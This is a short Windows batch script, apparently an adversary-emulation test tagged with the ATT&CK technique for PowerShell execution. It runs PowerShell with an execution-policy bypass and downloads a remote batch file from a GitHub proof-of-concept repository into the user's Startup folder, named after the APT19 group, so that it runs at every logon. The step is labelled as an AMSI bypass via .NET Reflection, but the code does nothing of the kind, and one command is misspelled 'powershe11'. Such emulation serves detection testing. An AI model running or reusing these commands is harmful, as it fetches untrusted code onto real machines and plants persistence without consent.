@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Exection using PowerShell (T1086)
ECHO.
ECHO [+] Executing Powershell 
ECHO -------------------------------------------------------------------
powershe11 get-host
ECHO.
ECHO [+] Powershell AMSI Bypass via .NET Reflection
ECHO -------------------------------------------------------------------
powershell -ep bypass [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $URL="https://raw.githubusercontent.com/greycel/poc/master/collect.bat";$FileName="APT19_Startup.bat";$webclient=New-Object System.Net.WebClient;$file="$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$FileName";$webclient.DownloadFile($URL,"$file");
ECHO.







